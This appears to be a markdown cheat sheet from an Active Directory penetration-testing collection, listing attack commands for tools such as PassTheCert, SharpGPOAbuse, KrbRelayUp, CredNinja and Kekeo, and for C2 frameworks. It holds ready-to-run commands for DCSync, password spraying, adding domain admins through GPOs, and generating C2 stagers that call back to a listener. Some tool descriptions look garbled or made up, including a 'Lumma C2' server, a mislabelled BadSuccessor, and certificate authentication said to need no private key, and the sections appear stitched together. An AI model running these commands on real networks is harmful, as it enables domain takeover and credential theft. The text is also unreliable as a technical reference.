- GPO backup and restore
- Permission inheritance reporting

---

## <span style="color:rgb(146, 208, 80)">29. RustHound CE</span>

RustHound CE by @OPENCYBER-FR is a Rust-based BloodHound collector (community edition) that collects AD data without PowerShell.

```bash
# Basic collection
rusthound -d domain.local -u user -p pass

# With NTLM hash
rusthound -d domain.local -u user --ntlm NTLM_HASH

# With Kerberos
rusthound -d domain.local -u user -p pass -k

# Collection methods
rusthound -d domain.local -u user -p pass -c all
rusthound -d domain.local -u user -p pass -c dconly
rusthound -d domain.local -u user -p pass -c group

# Specify DC
rusthound -d domain.local -u user -p pass --dc dc01.domain.local

# Output directory
rusthound -d domain.local -u user -p pass -o ./output/

# Compress output
rusthound -d domain.local -u user -p pass -z

# LDAPS
rusthound -d domain.local -u user -p pass --ldaps

# Verbose
rusthound -d domain.local -u user -p pass -v

# Thread count
rusthound -d domain.local -u user -p pass --threads 10
```

### Advantages
- No PowerShell dependency (bypasses CLM, script block logging)
- No .NET dependency (runs standalone)
- Faster collection than SharpHound for large domains
- Works from Linux (direct LDAP queries)
- Lower detection rate than PowerShell-based collectors
- LDAPS support

---

## <span style="color:rgb(255, 0, 0)">30. PassTheCert</span>

PassTheCert by @AlmondOffSec enables certificate-based authentication for lateral movement, allowing domain authentication using a certificate without the private key.

```bash
# Authenticate to LDAP with certificate
passthecert.py -cert ca.pfx -pass certpass -dc-ip 10.10.10.10 -d domain.local

# Add user to group via cert auth
passthecert.py -cert ca.pfx -pass certpass -dc-ip 10.10.10.10 -d domain.local \
  -action add-group-member -target "CN=user,CN=Users,DC=domain,DC=local" \
  -group "CN=Domain Admins,CN=Users,DC=domain,DC=local"

# Modify user attributes
passthecert.py -cert ca.pfx -pass certpass -dc-ip 10.10.10.10 -d domain.local \
  -action modify -target "CN=target,CN=Users,DC=domain,DC=local" \
  -attribute servicePrincipalName -value "HTTP/target.domain.local"

# DCSync with certificate
passthecert.py -cert ca.pfx -pass certpass -dc-ip 10.10.10.10 -d domain.local \
  -action dcsync

# DCSync specific user
passthecert.py -cert ca.pfx -pass certpass -dc-ip 10.10.10.10 -d domain.local \
  -action dcsync -user krbtgt

# Get TGT with certificate (like PKINIT)
passthecert.py -cert ca.pfx -pass certpass -dc-ip 10.10.10.10 -d domain.local \
  -action get-tgt
```

### Authentication flow
```
Certificate + Key --> PKINIT --> TGT --> TGS --> Service Access
No password or NTLM hash needed.
Can use any certificate issued by the ADCS.
```

---

## <span style="color:rgb(0, 176, 240)">31. Get-LAPSPasswords</span>

Get-LAPSPasswords retrieves LAPS (Local Administrator Password Solution) passwords from Active Directory.

```powershell
# Load module
Import-Module .\Get-LAPSPasswords.psm1

# Get all LAPS passwords
Get-LAPSPasswords -DomainController dc01.domain.local

# With credentials
$creds = Get-Credential
Get-LAPSPasswords -DomainController dc01.domain.local -Credential $creds

# Filter by computer
Get-LAPSPasswords -ComputerName "WS001"
Get-LAPSPasswords -ComputerName "WS001","WS002","FS001"

# Filter by OU
Get-LAPSPasswords -OU "OU=Workstations,DC=domain,DC=local"

# Export to CSV
Get-LAPSPasswords -DomainController dc01.domain.local | Export-Csv laps.csv -NoTypeInformation

# Formatted output
Get-LAPSPasswords -DomainController dc01.domain.local -Format Table

# With different LDAP filter
Get-LAPSPasswords -Filter "(operatingSystem=Windows 10*)"
```

### Requirements
- Read access to `ms-MCS-AdmPwd` attribute on computer objects
- Usually delegated to `LAPSWriters` group
- Domain admins can always read

---

## <span style="color:rgb(146, 208, 80)">32. SharpGPOAbuse</span>

SharpGPOAbuse by @pkb1s abuses GPO permissions to add malicious settings to group policies.

```powershell
# Add domain admin rights via GPO
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" \
  --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" \
  --Arguments "/c net localgroup administrators domain\user /add" \
  --GPOName "Malicious GPO"

# Add user rights via GPO
SharpGPOAbuse.exe --AddUserTask --TaskName "Update" \
  --Author "NT AUTHORITY\SYSTEM" --Command "powershell.exe" \
  --Arguments "-enc BASE64" \
  --GPOName "Malicious GPO"

# Add local admin via restricted groups
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount "DOMAIN\user" \
  --GPOName "Malicious GPO"

# Add immediate task (no computer restart needed)
SharpGPOAbuse.exe --AddComputerTask --TaskName "ImmediateUpdate" \
  --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" \
  --Arguments "/c whoami" \
  --GPOName "Malicious GPO" --Force

# Specify domain controller
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" \
  --Command "cmd.exe" --Arguments "/c whoami" \
  --GPOName "Malicious GPO" --DomainController dc01.domain.local

# Modify existing GPO
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" \
  --Command "cmd.exe" --Arguments "/c whoami" \
  --GPOName "Default Domain Policy"

# Apply to specific OU
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" \
  --Command "cmd.exe" --Arguments "/c whoami" \
  --GPOName "Malicious GPO" --TargetOU "OU=Workstations,DC=domain,DC=local"
```

### Requirements
- Write access to GPO (Edit settings, delete, modify security)
- GPO linked to target OU with computers
- Following GPUpdate / reboot
- Service accounts using GPO preferences (if storing creds)

---

## <span style="color:rgb(255, 0, 0)">33. GPORemoteAccessPolicy</span>

GPORemoteAccessPolicy identifies and exploits GPO-based Remote Access Policy controls.

```powershell
# Find GPOs that grant remote access
GPORemoteAccessPolicy.exe --search

# Add remote access via GPO
GPORemoteAccessPolicy.exe --grant --user DOMAIN\user

# Remove remote access restriction
GPORemoteAccessPolicy.exe --remove --user DOMAIN\user

# Check current remote access policy
GPORemoteAccessPolicy.exe --check

# List computers with remote access GPO
GPORemoteAccessPolicy.exe --list-members

# Specific GPO search
GPORemoteAccessPolicy.exe --search --gponame "*Remote*"
```

### Usage context
- Grant remote desktop access via GPO without local admin
- Add users to "Remote Desktop Users" via GPO Restricted Groups
- Modify Network Level Authentication (NLA) requirements via GPO

---

## <span style="color:rgb(0, 176, 240)">34. BadSuccessor / SharpSuccessor</span>

BadSuccessor and SharpSuccessor abuse GPO delegation inheritance by exploiting the `gpLink` order and delegation weaknesses.

### BadSuccessor (Python)
```bash
# Check GPO delegation
badsuccessor.py -d domain.local -u user -p pass -dc-ip 10.10.10.10

# Exploit GPO delegation
badsuccessor.py -d domain.local -u user -p pass -dc-ip 10.10.10.10 --exploit

# List all GPOs with delegation info
badsuccessor.py -d domain.local -u user -p pass -dc-ip 10.10.10.10 --list

# Check specific GPO
badsuccessor.py -d domain.local -u user -p pass -dc-ip 10.10.10.10 --gpo-id {GUID}
```

### SharpSuccessor (C#)
```powershell
# Enumerate GPO delegation
SharpSuccessor.exe enumerate

# Check GPO link order
SharpSuccessor.exe check

# Exploit delegation
SharpSuccessor.exe takeover --gpo-name "Target GPO"

# Abuse GPO link order
SharpSuccessor.exe abuselinkorder --target-ou "OU=Workstations,DC=domain,DC=local"
```

### Attack concept
```
1. Find GPO where delegate has Write access but not Full Control
2. Delegate can modify GPO link order (gpLink)
3. Reorder GPO linking so malicious GPO takes precedence
4. Malicious GPO settings override legitimate ones
```

---

## <span style="color:rgb(146, 208, 80)">35. Lumma C2</span>

Lumma is a C2 (Command & Control) framework written in .NET with an HTTP/HTTPS based communication model.

```bash
# Server setup
LummaServer.exe --port 443 --ssl

# Generate payload
LummaServer.exe --generate --listener https://10.10.10.5:443

# Stager types
LummaServer.exe --generate --listener https://10.10.10.5:443 --stager powershell
LummaServer.exe --generate --listener https://10.10.10.5:443 --stager csharp
LummaServer.exe --generate --listener https://10.10.10.5:443 --stager shellcode

# Management console
LummaServer.exe --interactive

# List agents
list-agents

# Execute command on agent
interact --agent AGENT_ID --command "whoami"

# Upload/download files
download --agent AGENT_ID --remote "C:\Users\Public\file.txt"
upload --agent AGENT_ID --local "/local/payload.exe" --remote "C:\Temp\payload.exe"
```

### Features
- AES-encrypted C2 traffic
- Multiple stager types (PowerShell, C#, shellcode)
- SOCKS proxy support
- File upload/download
- Process injection
- Keylogging
- Screenshot capture

---

## <span style="color:rgb(255, 0, 0)">36. Villain C2</span>

Villain is a cross-platform C2 framework written in Python3 with multi-client support and encrypted comms.

```bash
# Server startup
python3 villain.py

# Generate stager
generate --ip 10.10.10.5 --port 443 --payload windows/psh

# Available payload types
generate --list   # List all payload types

# PowerShell stager
generate --ip 10.10.10.5 --port 443 --payload windows/psh --out payload.ps1

# Python stager
generate --ip 10.10.10.5 --port 443 --payload linux/py --out payload.py

# Generate with AMSI bypass
generate --ip 10.10.10.5 --port 443 --payload windows/psh --amsi

# Interact with agent
interact --agent AGENT_ID

# Commands in session
shell whoami
download C:\temp\file.txt
upload /local/file.txt C:\temp\file.txt
socks 1080
```

### Features
- Cross-platform (Linux, Windows, macOS)
- PowerShell/Python payloads
- AMSI bypass integration
- SOCKS proxy
- File transfer
- Payload encryption (AES)
- Multi-session management
- Obvious detection (signature-based)

---

## <span style="color:rgb(0, 176, 240)">37. PwnDoc / PwnDoc-ng</span>

PwnDoc / PwnDoc-ng is a pentest reporting tool for managing AD security assessment findings and generating professional reports.

```bash
# Docker setup
docker run -p 80:80 -v pundoc_data:/data pundoc-ng

# Web interface access
# http://localhost:80
# Default credentials: admin:admin

# Import BloodHound data
# Upload BloodHound ZIP files via web UI -> Audit

# Import custom data
# Users, computers, groups via CSV/JSON import
```

### Features
- AD data management (users, computers, groups, OUs)
- Attack path visualization
- Report generation (DOCX, PDF)
- Custom finding templates
- Data import via BloodHound
- Evidence management
- Team collaboration
- Data deduplication
- Remediation tracking

### PwnDoc categories
```
- AS-REP Roasting
- Kerberoasting
- Password Spraying
- SMB Signing
- LLMNR/NBT-NS
- ADCS Vulnerabilities
- Delegation Issues
- GPO Misconfigurations
- Trust Attacks
- ACL Abuse
```

---

## <span style="color:rgb(146, 208, 80)">38. Merlin C2</span>

Merlin is a cross-platform C2 framework written in Go with HTTP/2 and HTTP/3 communication.

```bash
# Server setup
./merlinServer -l 0.0.0.0:443 -x

# Generate agent
./merlinCLI
Merlin > listeners
Merlin > listen -i 0.0.0.0:443
Merlin > agents generate -l https://10.10.10.5:443 -o agent.exe

# PowerShell stager
Merlin > agents generate -l https://10.10.10.5:443 -o agent.ps1 -p windows/powershell

# Interact with agent
Merlin > sessions
Merlin > use AGENT_GUID

# Execute commands
shell whoami
shell ipconfig

# Upload/download
upload /local/file.txt remote_file.txt
download C:\Users\Public\file.txt

# Load PowerShell module
load-ps /path/to/PowerView.ps1
run-ps "Get-NetUser"

# SOCKS
socks start 9050

# SMB listener (for Egress)
listeners add -i 0.0.0.0 -p 445 -pr smb
```

### Features
- HTTP/2 and HTTP/3 (QUIC) communication
- gRPC protocol
- AES-256 encrypted comms
- PowerShell execution support
- Cross-platform agents (Windows, Linux, macOS, ARM)
- SMB and TCP bind payloads
- SOCKS5 proxy
- File upload/download
- Process injection
- Memory-only execution (no disk writes for agent)

---

## <span style="color:rgb(0, 176, 240)">39. KrbRelayUp</span>

KrbRelayUp by @Dec0ne extends KrbRelay for Windows-based Kerberos relay to LDAP with automated privilege escalation.

```powershell
# Full automatic chain (adds shadow credential -> DA via RBCD)
KrbRelayUp.exe full -m shadowcred -d domain.local -dc dc01.domain.local

# Specific relay only
KrbRelayUp.exe relay -d domain.local -dc dc01.domain.local

# Add shadow credential
KrbRelayUp.exe shadowcred -d domain.local -dc dc01.domain.local

# RBCD abuse
KrbRelayUp.exe rbcd -d domain.local -dc dc01.domain.local

# Check for vulnerable CLSIDs
KrbRelayUp.exe check -d domain.local -dc dc01.domain.local

# Use specific CLSID
KrbRelayUp.exe relay -d domain.local -dc dc01.domain.local -clsid {CLSID}

# Verbose
KrbRelayUp.exe relay -d domain.local -dc dc01.domain.local -v
```

### Attack chain
```
1. KrbRelayUp relays Kerberos from Windows to LDAP on DC
2. Uses shadow credentials to add KeyCredentialLink to target computer
3. Authenticates as target computer via PKINIT
4. Sets RBCD (Resource-Based Constrained Delegation) on target
5. Now attacker can impersonate any user as the target computer
```

---

## <span style="color:rgb(146, 208, 80)">Tool Selection Quick Reference</span>

| Task | Tool | Command Example |
|------|------|-----------------|
| ADCS enumeration | Certify | `Certify.exe find /vulnerable` |
| ADCS exploitation | Certipy | `certipy req -u user -p pass -ca CA -template Vuln -upn admin@dom` |
| DNS dump | adidnsdump | `adidnsdump -u domain\\user -p pass domain.local --all` |
| Shadow Credentials | PyWhisker | `pywhisker.py -d dom -u user -p pass --target user --action add` |
| Shadow Credentials (C#) | KrbRelay | `KrbRelay.exe -spn ldap/dc -clsid CLSID -shadowcred` |
| Auth coercion | Coercer | `coercer coerce -l IP -t target -u user -p pass` |
| Domain backup key | SharpDPAPI | `SharpDPAPI.exe backupkeys /server:dc` |
| DPAPI decryption | SharpDPAPI | `SharpDPAPI.exe masterkeys /rpc` |
| Browser passwords | SharpChrome | `SharpChrome.exe logins` |
| AD recon (HTML) | ADRecon | `Invoke-ADRecon -Collect All -GenerateHTML` |
| AD dump (JSON/HTML) | ldapdomaindump | `ldapdomaindump -u domain\\user -p pass 10.0.0.1` |
| SMB shares | smbmap | `smbmap -H target -u user -p pass -R` |
| SMB client | smbclient | `smbclient //target/share -U user%pass` |
| SMB/RPC enum | enum4linux-ng | `enum4linux-ng target -u user -p pass -A` |
| PKINIT auth | PKINITtools | `gettgtpkinit.py -cert-pfx cert.pfx domain/user user.ccache` |
| Golden certificate | ForgeCert | `ForgeCert.exe --CaCertPath CA.pfx --Subject admin --NewCertPath forged.pfx` |
| AD object manipulation | bloodyAD | `bloodyAD --host target -d dom -u user -p pass set shadow "CN=user,CN=Users,..."` |
| ADCS scanner | LockSmith | `LockSmith.py -dc-ip target -d dom -u user -p pass` |
| AD priv esc audit | adPEAS | `Invoke-adPEAS -CurrentUser` |
| LDAP relay check | LDAPRelayScan | `LDAPRelayScan.py -target 10.10.10.10` |
## <span style="color:rgb(255, 192, 0)">17. Adalanche — AD Visualization & Analysis</span>

**Author**: @lkarlslund | **URL**: https://github.com/lkarlslund/Adalanche

Adalanche instantly reveals what permissions users and groups have in Active Directory. It visualizes who can take over accounts, machines, or the entire domain. Unlike BloodHound which requires Neo4j, Adalanche produces standalone HTML reports.

```powershell
# Collect data from a live domain
Adalanche.exe collect --username DOMAIN\user --password pass --domain-controller dc.domain.local

# Also supports LDAP
Adalanche.exe collect --bind ldap://dc.domain.local --username DOMAIN\user --password pass

# Analyze an NTDS.dit file offline
Adalanche.exe collect --ntds-file ntds.dit --system hive system.hive

# Open the collector GUI for interactive exploration
Adalanche.exe gui
```

**Use cases**: Rapid permission analysis, finding who has admin rights to what, identifying privilege escalation paths without Neo4j. Output is a browsable HTML page with expandable sections.

## <span style="color:rgb(255, 192, 0)">18. CredNinja — Credential Testing and Lateral Movement</span>

**Author**: @SpiderLabs | **URL**: https://github.com/SpiderLabs/CredNinja

CredNinja tests credentials (passwords, hashes, tokens) across multiple hosts and protocols, automating credential reuse detection and lateral movement.

```bash
# Test credentials via SMB
python3 CredNinja.py -t targets.txt -u user -p password -d domain.local -o smb

# Test with hashes
python3 CredNinja.py -t targets.txt -u user -H NTLM_HASH -d domain.local -o smb

# Execute a command on successful authentication
python3 CredNinja.py -t 192.168.1.0/24 -u Administrator -H HASH -d domain.local -c whoami

# Test via WMI
python3 CredNinja.py -t targets.txt -u user -p pass -d domain.local -o wmi

# Test via WinRM
python3 CredNinja.py -t targets.txt -u user -p pass -d domain.local -o winrm

# Spray credentials across entire subnet
python3 CredNinja.py -t 192.168.1.0/24 -u users.txt -p 'Password1' -d domain.local -o smb

# Output results to file
python3 CredNinja.py -t targets.txt -u user -p pass -o smb --output results.txt
```

**Use cases**: Validating credential reuse across a network, lateral movement validation, password spray testing via multiple protocols.

## <span style="color:rgb(255, 192, 0)">19. Kekeo — Kerberos Toolkit</span>

**Author**: @gentilkiwi | **URL**: https://github.com/gentilkiwi/kekeo

Kekeo is a Kerberos abuse toolkit by the author of Mimikatz. It focuses on Kerberos protocol manipulation, ticket requests, and delegation attacks. Useful for PKINIT operations and S4U attacks.

```powershell
# Request TGT with password
tgt::ask /user:Administrator /password:Pass123! /domain:domain.local /dc:dc.domain.local

# Request TGT with RC4 hash (overpass-the-hash)
tgt::ask /user:Administrator /ntlm:HASH /domain:domain.local

# Request TGT with AES key
tgt::ask /user:Administrator /aes256:AES_KEY /domain:domain.local

# Request TGS for a service
tgs::ask /tgt:BASE64_TGT /service:cifs/target.domain.local

# S4U2Self attack — get a forwardable TGS for a user
tgs::s4u /tgt:BASE64_TGT /user:TargetUser@domain.local /service:cifs/target.domain.local

# S4U2Proxy — impersonate a user to a specific service
tgs::s4u /tgt:BASE64_TGT /user:Administrator@domain.local /service:cifs/target.domain.local

# PKINIT — request TGT using certificate
tgt::ask /user:user@domain.local /certpfx:cert.pfx /password:cert_pass /domain:domain.local

# List tickets in memory
misc::list
```

**Use cases**: Alternative to Rubeus for S4U attacks, PKINIT authentication with certificates, overpass-the-hash with Kerberos tickets, older systems where .NET is not available for Rubeus.

**Cross-reference**: See `06_Kerberos_Attacks/` and `05_Rubeus.md` for equivalent Rubeus commands.

## <span style="color:rgb(255, 192, 0)">20. ASPERoast.ps1 — AS-REP Roasting PowerShell Script</span>

**Author**: @HarmJ0y | **Part of**: PowerSploit (older method)

ASPERoast.ps1 is a PowerShell script for AS-REP roasting — requesting AS-REP responses for accounts with Kerberos pre-authentication disabled. Superseded by Rubeus and Impacket GetNPUsers but still useful on constrained systems.

```powershell
# Load the script
powershell -ep bypass
Import-Module .\ASPERoast.ps1

# AS-REP roast all users in the domain
Invoke-ASREPRoast

# AS-REP roast a specific user
Invoke-ASREPRoast -UserName svc_oracle

# Output to a file suitable for hashcat
Invoke-ASREPRoast | fl
```

**Note**: This is the original AS-REP roasting script. Modern tools (Rubeus, GetNPUsers.py) provide more features and better output formatting. See `02_Initial_Access/01_ASREPRoast.md` for current best practices.

**Cross-reference**: See `01_ASREPRoast.md` (Initial Access), `04_Kerberos_Attacks/01_ASREPRoast_Deep.md` (Kerberos), `05_Rubeus.md` (Rubeus), `01_Impacket_Complete.md` (GetNPUsers).

---

## Quick Reference Table

| AD-IDNS audit | BlueTuxedo | `BlueTuxedo.py -dc-ip target -d dom -u user -p pass` |
| GPO audit | Group3r | `Group3r.exe -d domain.local -u user -p pass` |
| GPO security | GPOZaurr | `Get-GPOZaurr -Type Permission` |
| BloodHound reporter | AD-Miner | `AD-Miner.py -u neo4j -p password -q all -o html` |
| BH path prioritization | GoodHound | `goodhound -d domain.local -u neo4j -p password` |
| GPO BH collector | GPO-Hound | `gpo-hound -d domain.local -u user -p pass` |
| Rust BH collector | RustHound CE | `rusthound -d domain.local -u user -p pass` |
| Cert auth LM | PassTheCert | `passthecert.py -cert ca.pfx -pass pass -d dom -action get-tgt` |
| LAPS reader | Get-LAPSPasswords | `Get-LAPSPasswords -DomainController dc` |
| GPO abuse | SharpGPOAbuse | `SharpGPOAbuse.exe --AddLocalAdmin --UserAccount DOMAIN\user --GPOName "GPO"` |
| GPO remote access | GPORemoteAccessPolicy | `GPORemoteAccessPolicy.exe --grant --user DOMAIN\user` |
| GPO delegation abuse | BadSuccessor | `badsuccessor.py -d dom -u user -p pass --exploit` |
| Kerberos relay | KrbRelayUp | `KrbRelayUp.exe full -d domain.local -dc dc` |
| In-memory tools | PowerSharpPack | `Invoke-Rubeus -Command "kerberoast"` |
| C2 framework | Merlin | `./merlinServer -l 0.0.0.0:443` |
| C2 framework | Villain | `python3 villain.py` |
| C2 framework | Lumma | `LummaServer.exe --port 443` |
| Reporting | PwnDoc | `docker run -p 80:80 pundoc-ng` |
